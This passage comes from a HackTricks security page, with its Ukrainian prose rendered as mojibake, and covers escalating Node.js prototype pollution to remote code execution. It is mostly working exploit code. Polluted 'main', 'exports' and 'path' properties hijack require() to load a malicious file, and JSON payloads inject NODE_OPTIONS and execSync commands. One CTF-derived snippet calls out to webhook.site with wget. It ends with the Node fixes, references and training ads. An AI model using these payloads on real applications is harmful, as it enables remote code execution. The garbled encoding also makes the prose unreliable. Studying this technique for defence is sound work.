* node\_modules/runtypes/scripts/**format.js**:13:`const npmBinPath = execSync('npm bin').toString().trim();`
* node\_modules/node-pty/scripts/**publish.js**:31:`const result = cp.spawn('npm', args, { stdio: 'inherit' });`

</details>

### –í—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è —à–ª—è—Ö—É –¥–æ —Ñ–∞–π–ª—É —á–µ—Ä–µ–∑ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É

{% hint style="warning" %}
**–ü–æ–ø–µ—Ä–µ–¥–Ω—è —Ç–µ—Ö–Ω—ñ–∫–∞ –≤–∏–º–∞–≥–∞—î**, —â–æ–± **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –∫–æ–Ω—Ç—Ä–æ–ª—é–≤–∞–≤ —à–ª—è—Ö –¥–æ —Ñ–∞–π–ª—É**, —è–∫–∏–π –±—É–¥–µ **–≤–∏–º–∞–≥–∞—Ç–∏—Å—è**. –ê–ª–µ —Ü–µ –Ω–µ –∑–∞–≤–∂–¥–∏ —Ç–∞–∫.
{% endhint %}

–û–¥–Ω–∞–∫, —è–∫—â–æ –∫–æ–¥ –±—É–¥–µ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ require –ø—ñ—Å–ª—è –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É, –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ **–Ω–µ –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç–µ —à–ª—è—Ö**, —è–∫–∏–π –±—É–¥–µ –≤–∏–º–∞–≥–∞—Ç–∏—Å—è, –≤–∏ **–º–æ–∂–µ—Ç–µ –ø—Ä–∏–º—É—Å–∏—Ç–∏ —ñ–Ω—à–∏–π, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è–º –ø—Ä–æ—Ç–æ—Ç–∏–ø—É**. –¢–æ–∂ –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —Ä—è–¥–æ–∫ –∫–æ–¥—É –≤–∏–≥–ª—è–¥–∞—î —è–∫ `require("./a_file.js")` –∞–±–æ `require("bytes")`, –≤—ñ–Ω **–≤–∏–º–∞–≥–∞—Ç–∏–º–µ –ø–∞–∫–µ—Ç, —è–∫–∏–π –≤–∏ –∑–∞–±—Ä—É–¥–Ω–∏–ª–∏**.

–û—Ç–∂–µ, —è–∫—â–æ require –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è –ø—ñ—Å–ª—è –≤–∞—à–æ–≥–æ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É —ñ –Ω–µ–º–∞—î —Ñ—É–Ω–∫—Ü—ñ—ó spawn, —Ü–µ –∞—Ç–∞–∫–∞:

* –ó–Ω–∞–π–¥—ñ—Ç—å **`.js` —Ñ–∞–π–ª –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å–∏—Å—Ç–µ–º–∏**, —è–∫–∏–π –ø—Ä–∏ **–≤–∏–º–æ–∑—ñ** –±—É–¥–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ —â–æ—Å—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `child_process`**
* –Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ —Ñ–∞–π–ª–∏ –Ω–∞ –ø–ª–∞—Ç—Ñ–æ—Ä–º—É, —è–∫—É –≤–∏ –∞—Ç–∞–∫—É—î—Ç–µ, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Ñ–∞–π–ª —Ç–∞–∫–æ–≥–æ —Ç–∏–ø—É
* –ó–∞–±—Ä—É–¥–Ω—ñ—Ç—å —à–ª—è—Ö–∏, —â–æ–± **–ø—Ä–∏–º—É—Å–∏—Ç–∏ –≤–∏–º–æ–≥—É –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ `.js` —Ñ–∞–π–ª**, —è–∫–∏–π –≤–∏–∫–æ–Ω–∞—î —â–æ—Å—å –∑ child\_process
* **–ó–∞–±—Ä—É–¥–Ω—ñ—Ç—å —Å–µ—Ä–µ–¥–æ–≤–∏—â–µ/cmdline**, —â–æ–± –≤–∏–∫–æ–Ω–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥, –∫–æ–ª–∏ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è —Ñ—É–Ω–∫—Ü—ñ—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è child\_process (–¥–∏–≤. –ø–æ—á–∞—Ç–∫–æ–≤—ñ —Ç–µ—Ö–Ω—ñ–∫–∏)

#### –ê–±—Å–æ–ª—é—Ç–Ω–∏–π require

–Ø–∫—â–æ –≤–∏–∫–æ–Ω—É–≤–∞–Ω–∏–π require —î **–∞–±—Å–æ–ª—é—Ç–Ω–∏–º** (`require("bytes")`) —ñ **–ø–∞–∫–µ—Ç –Ω–µ –º—ñ—Å—Ç–∏—Ç—å main** —É —Ñ–∞–π–ª—ñ `package.json`, –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–∞–±—Ä—É–¥–Ω–∏—Ç–∏ –∞—Ç—Ä–∏–±—É—Ç `main`** —ñ –∑–º—É—Å–∏—Ç–∏ **–≤–∏–º–æ–≥—É –≤–∏–∫–æ–Ω–∞—Ç–∏ —ñ–Ω—à–∏–π —Ñ–∞–π–ª**.

{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
```
{% endtab %}
{% endtabs %}

#### –í—ñ–¥–Ω–æ—Å–Ω–µ –≤–∏–º–∞–≥–∞–Ω–Ω—è - 1

–Ø–∫—â–æ **–≤—ñ–¥–Ω–æ—Å–Ω–∏–π —à–ª—è—Ö** –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è –∑–∞–º—ñ—Å—Ç—å –∞–±—Å–æ–ª—é—Ç–Ω–æ–≥–æ —à–ª—è—Ö—É, –≤–∏ –º–æ–∂–µ—Ç–µ –∑–º—É—Å–∏—Ç–∏ node **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —ñ–Ω—à–∏–π —à–ª—è—Ö**:

{% tabs %}
{% tab title="–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### –í—ñ–¥–Ω–æ—Å–Ω–µ –≤–∏–º–∞–≥–∞–Ω–Ω—è - 2

{% tabs %}
{% tab title="–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è" %}
{% code overflow="wrap" %}
```javascript
// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
```
{% endcode %}
{% endtab %}

{% tab title="malicious.js" %}
```javascript
const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
```
{% endtab %}
{% endtabs %}

#### –í—ñ–¥–Ω–æ—Å–Ω–µ –≤–∏–º–∞–≥–∞–Ω–Ω—è - 3

–°—Ö–æ–∂–µ –Ω–∞ –ø–æ–ø–µ—Ä–µ–¥–Ω—î, —Ü–µ –±—É–ª–æ –∑–Ω–∞–π–¥–µ–Ω–æ –≤ [**—Ü—å–æ–º—É –æ–ø–∏—Å—ñ**](https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs).
```javascript
// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```
## VM Gadgets

–£ —Å—Ç–∞—Ç—Ç—ñ [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf) —Ç–∞–∫–æ–∂ –∑–∞–∑–Ω–∞—á–µ–Ω–æ, —â–æ –∫–æ–Ω—Ç—Ä–æ–ª—å **`contextExtensions`** –∑ –¥–µ—è–∫–∏—Ö –º–µ—Ç–æ–¥—ñ–≤ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **`vm`** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π —è–∫ –≥–∞–¥–∂–µ—Ç.\
–û–¥–Ω–∞–∫, —è–∫ —ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ –º–µ—Ç–æ–¥–∏ **`child_process`**, —Ü–µ –±—É–ª–æ **–≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ** –≤ –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ—è—Ö.

## Fixes & Unexpected protections

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É –ø—Ä–∞—Ü—é—î, —è–∫—â–æ **–∞—Ç—Ä–∏–±—É—Ç** –æ–±'—î–∫—Ç–∞, –¥–æ —è–∫–æ–≥–æ –∑–≤–µ—Ä—Ç–∞—é—Ç—å—Å—è, —î **–Ω–µ–≤–∏–∑–Ω–∞—á–µ–Ω–∏–º**. –Ø–∫—â–æ –≤ **–∫–æ–¥—ñ** —Ü–µ–π **–∞—Ç—Ä–∏–±—É—Ç** **–æ—Ç—Ä–∏–º—É—î** **–∑–Ω–∞—á–µ–Ω–Ω—è**, –≤–∏ **–Ω–µ –∑–º–æ–∂–µ—Ç–µ –π–æ–≥–æ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç–∏**.

–£ —á–µ—Ä–≤–Ω—ñ 2022 —Ä–æ–∫—É –∑ [**—Ü—å–æ–≥–æ –∫–æ–º—ñ—Ç—É**](https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a) –∑–º—ñ–Ω–Ω–∞ `options` –∑–∞–º—ñ—Å—Ç—å `{}` —î **`kEmptyObject`**. –¶–µ **–∑–∞–ø–æ–±—ñ–≥–∞—î –∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—é –ø—Ä–æ—Ç–æ—Ç–∏–ø—É** –≤—ñ–¥ –≤–ø–ª–∏–≤—É –Ω–∞ **–∞—Ç—Ä–∏–±—É—Ç–∏** **`options`** –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è RCE.\
–ü—Ä–∏–Ω–∞–π–º–Ω—ñ –∑ –≤–µ—Ä—Å—ñ—ó v18.4.0 —Ü—è –∑–∞—Ö–∏—Å—Ç –±—É–ª–∞ **—Ä–µ–∞–ª—ñ–∑–æ–≤–∞–Ω–∞**, —ñ —Ç–æ–º—É **–µ–∫—Å–ø–ª–æ–π—Ç–∏** `spawn` —ñ `spawnSync`, —â–æ –≤–ø–ª–∏–≤–∞—é—Ç—å –Ω–∞ –º–µ—Ç–æ–¥–∏, **–±—ñ–ª—å—à–µ –Ω–µ –ø—Ä–∞—Ü—é—é—Ç—å** (—è–∫—â–æ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è `options`!).

–£ [**—Ü—å–æ–º—É –∫–æ–º—ñ—Ç—ñ**](https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9) **–∑–∞–±—Ä—É–¥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Ç–æ—Ç–∏–ø—É** **`contextExtensions`** –∑ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ vm –±—É–ª–æ **—Ç–∞–∫–æ–∂ —á–∞—Å—Ç–∫–æ–≤–æ –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–æ**, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ –Ω–∞ **`kEmptyObject`** –∑–∞–º—ñ—Å—Ç—å **`{}`.**

### **Other Gadgets**

* [https://github.com/yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)
* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## References

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://blog.sonarsource.com/blitzjs-prototype-pollution/](https://blog.sonarsource.com/blitzjs-prototype-pollution/)
* [https://arxiv.org/pdf/2207.11171.pdf](https://arxiv.org/pdf/2207.11171.pdf)
* [https://portswigger.net/research/server-side-prototype-pollution](https://portswigger.net/research/server-side-prototype-pollution)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
